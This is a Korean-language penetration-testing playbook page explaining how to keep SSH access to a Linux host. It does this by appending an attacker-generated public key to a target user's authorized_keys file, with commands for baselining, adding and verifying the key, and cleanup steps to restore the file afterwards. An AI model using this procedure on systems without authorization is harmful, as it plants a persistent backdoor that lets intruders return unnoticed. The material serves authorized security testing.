---
tags:
  - 환경/linux
  - 서비스/ssh
시작조건: ["대상 사용자 홈 디렉터리 또는 authorized_keys 쓰기 권한 확보", "대상 SSH 서비스 접근 가능"]
필요권한: ["대상 사용자의 .ssh 디렉터리와 authorized_keys 파일 쓰기 권한"]
필요조건: ["대상 사용자명과 홈 디렉터리", "공격 호스트에서 생성한 고유 SSH 키 쌍", "변경 전 파일 내용·소유자·권한 기록"]
결과: ["추가한 공개키로 대상 사용자 SSH 세션", "재접속 가능한 SSH 인증 경로"]
---

# SSH Authorized Keys 등록

## 한 줄 판단

대상 사용자의 홈 디렉터리 또는 `authorized_keys`에 쓸 수 있고 해당 사용자의 SSH 로그인이 가능하다면, 변경 전 파일 내용과 메타데이터를 기록한 뒤 고유한 공개키 한 줄을 추가하여 그 사용자로 재접속하고 추가한 한 줄만 제거할 수 있는지 확인한다.

## 사용할 때

- 현재 셸은 불안정하지만 같은 사용자로 SSH 재접속할 경로가 필요할 때.
- 대상 사용자의 홈 디렉터리나 `.ssh/authorized_keys`에 쓸 수 있을 때.
- 기존 키를 덮어쓰지 않고 작업에서 추가한 키만 정확히 식별하고 제거할 수 있을 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 대상 사용자와 홈 | SSH로 로그인할 실제 사용자와 홈 경로 확인 | `getent passwd <USER>` | 계정명과 홈 경로를 추측해 쓰지 않음 |
| 파일 쓰기 권한 | `.ssh` 생성 또는 `authorized_keys` 수정 가능 | `namei -l <HOME>/.ssh/authorized_keys`, `test -w` | 현재 계정·그룹·ACL과 홈 마운트 상태 확인 |
| SSH 접근 경로 | 공격 호스트에서 대상 SSH 포트 도달 | `ssh -v <USER>@<TARGET>` | 네트워크 위치와 SSH 정책 확인 |
| 기준값 | 기존 파일 내용, hash, owner, group, mode 기록 | `stat`, `sha256sum`, 백업 사본 | 기준값 없이 키를 추가하지 않음 |

## 실행

### 대상 Linux 호스트에서 변경 전 상태 기록

```bash
getent passwd <USER>
stat -c '%U:%G %a %n' <HOME>/.ssh <HOME>/.ssh/authorized_keys 2>/dev/null
sha256sum <HOME>/.ssh/authorized_keys 2>/dev/null
cp -a <HOME>/.ssh/authorized_keys <BACKUP_PATH> 2>/dev/null || true
```

확인할 출력:

- 대상 사용자의 실제 홈 경로와 기존 `.ssh`, `authorized_keys`의 존재 여부.
- 기존 파일이 있으면 소유자·그룹·mode·hash와 백업 사본을 기록한다.
- 기존 파일이 없으면 이번 작업에서 디렉터리와 파일을 새로 만들었다는 사실을 별도로 기록한다.

### 공격 호스트에서 고유 키 쌍 생성

```bash
ssh-keygen -t ed25519 -f <LOCAL_KEY> -C "offsec-<UNIQUE_ID>" -N ''
```

확인할 출력:

- `<LOCAL_KEY>`와 `<LOCAL_KEY>.pub`가 생성되고 공개키 끝의 고유 comment로 이번 키를 구분할 수 있다.

### 대상 Linux 호스트에서 공개키 한 줄 추가

```bash
install -d -m 700 -o <USER> -g <GROUP> <HOME>/.ssh
PUBKEY='<FULL_PUBLIC_KEY_LINE>'
grep -qxF "$PUBKEY" <HOME>/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "$PUBKEY" >> <HOME>/.ssh/authorized_keys
chown <USER>:<GROUP> <HOME>/.ssh/authorized_keys
chmod 600 <HOME>/.ssh/authorized_keys
grep -nF "$PUBKEY" <HOME>/.ssh/authorized_keys
```

확인할 출력:

- 고유 공개키 한 줄이 정확히 한 번만 존재한다.
- 기존 파일이 있었다면 다른 키 줄이 그대로 남아 있다.
- 파일과 디렉터리의 소유자·mode가 SSH가 읽을 수 있는 상태다.

### 공격 호스트에서 새 키 인증 검증

```bash
ssh -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o PasswordAuthentication=no -i <LOCAL_KEY> <USER>@<TARGET>
id
hostname
```

확인할 출력:

- 지정한 키의 publickey 인증으로 셸이 열리고 `id`가 `<USER>`와 일치한다.
- 포트 연결이나 키 제안만으로 성공으로 기록하지 않고 실제 셸과 사용자 identity를 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 새 키로 로그인하고 `id`가 대상 사용자와 일치 | 공개키 등록과 SSH 인증 성공 | 대상 사용자 SSH 세션 | [[Linux 셸 확보 후 초기 열거와 권한 상승]] |
| 키 줄은 있으나 `Permission denied (publickey)` | SSH가 파일을 읽지 못하거나 계정·정책이 맞지 않음 | 시작 상태 유지 | 홈 경로, owner, mode, `AuthorizedKeysFile`, 알고리즘 정책 확인 |
| 다른 사용자로 로그인됨 | 사용자명 또는 SSH config가 예상과 다름 | 잘못된 계정 세션 | `ssh -v`, Host alias와 대상 사용자 재확인 |
| 기존 키 줄이 사라짐 | 파일을 덮어썼거나 복구가 필요한 상태 | 기존 인증 경로 변경 | 백업에서 원래 내용 복원 후 hash와 줄 수 확인 |

## 확인할 출력과 권한

- 새 SSH 세션의 `id`와 `hostname`으로 대상 사용자와 호스트를 확인한다.
- 현재 셸의 쓰기 권한, 새 키의 로그인 성공, 로그인 후 실제 사용자 권한을 서로 다른 결과로 기록한다.

## 변경 영향과 복구

이번에 추가한 공개키 전체 한 줄만 제거한다. 기존 파일을 통째로 교체하지 않는다.

```bash
PUBKEY='<FULL_PUBLIC_KEY_LINE>'
grep -vxF "$PUBKEY" <HOME>/.ssh/authorized_keys > <HOME>/.ssh/authorized_keys.tmp
cat <HOME>/.ssh/authorized_keys.tmp > <HOME>/.ssh/authorized_keys
rm -f <HOME>/.ssh/authorized_keys.tmp
grep -nF "$PUBKEY" <HOME>/.ssh/authorized_keys || echo "key removed"
stat -c '%U:%G %a %n' <HOME>/.ssh <HOME>/.ssh/authorized_keys
sha256sum <HOME>/.ssh/authorized_keys
```

- 기존 파일이 있었다면 내용 hash, owner, group과 mode가 변경 전 기준값과 같은지 확인한다. 차이가 있으면 기록한 백업으로 정확히 복원한다.
- 이번 작업에서 `authorized_keys`를 새로 만들었다면 키 제거 후 파일이 비었을 때 파일을 제거한다. `.ssh`도 이번에 만들었고 비어 있을 때만 제거한다.
- 대상 호스트에 만든 `<BACKUP_PATH>`는 기준값 복원과 확인이 끝난 뒤 제거한다.
- 공격 호스트의 `<LOCAL_KEY>`와 `<LOCAL_KEY>.pub`는 더 이상 필요하지 않으면 제거한다.

## 후속 공격 연결

- 새 SSH 세션 확인: [[SSH credential 및 키 인증 검증]]
- Linux 셸 재평가: [[Linux 셸 확보 후 초기 열거와 권한 상승]]

## 관련 서비스

- [[22_SSH]]

## 관련 도구

- [[ssh]]
